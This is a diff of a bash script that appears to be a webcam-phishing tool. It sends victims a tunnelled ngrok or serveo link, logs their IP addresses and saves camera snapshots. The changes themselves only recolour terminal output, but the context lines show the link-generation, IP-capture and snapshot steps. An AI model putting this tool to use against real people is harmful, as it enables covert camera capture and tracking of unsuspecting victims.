@@ -81,7 +81,7 @@ catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\033[1;92m[\033[0m+\033[1;92m] IP:\033[0m\033[1;77m %s\033[0m\n" $ip
+printf "\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] IP:\033[0m\033[1;77m %s\033[0m\n" $ip
 
 cat ip.txt >> saved.ip.txt
 
@@ -95,7 +95,7 @@ while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\033[1;92m[\033[0m+\033[1;92m] Target opened the link!\n"
+printf "\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Target opened the link!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -109,7 +109,7 @@ mv .*.png images/img"$RANDOM".png
 } &> /dev/null
 printf "\033[1;77m[\033[0m\033[1;93m*\033[0m\033[1;77m] Getting camera snapshot...\033[0m\n"
 sleep 0.5
-printf "\033[1;92m[\033[0m+\033[1;92m] Camera snapshot received!\033[0m\n"
+printf "\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Camera snapshot received!\033[0m\n"
 rm -rf .log.log
 fi
 sleep 0.5
@@ -144,7 +144,7 @@ fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\033[1;92m[\033[0m+\033[1;92m] Direct link:\033[0m\033[1;77m %s \n' $send_link
+printf '\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Direct link:\033[0m\033[1;77m %s \n' $send_link
 
 }
 
@@ -202,7 +202,7 @@ printf "\033[1;77m[\033[0m\033[1;93m*\033[0m\033[1;77m] Starting Ngrok...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\033[1;92m[\033[0m+\033[1;92m] Direct link:\033[0m\033[1;77m %s\033[0m\n" $link
+printf "\033[1;92m[\033[0m\033[1;77m+\033[0m\033[1;92m] Direct link:\033[0m\033[1;77m %s\033[0m\n" $link
 
 payload_ngrok
 checkfound
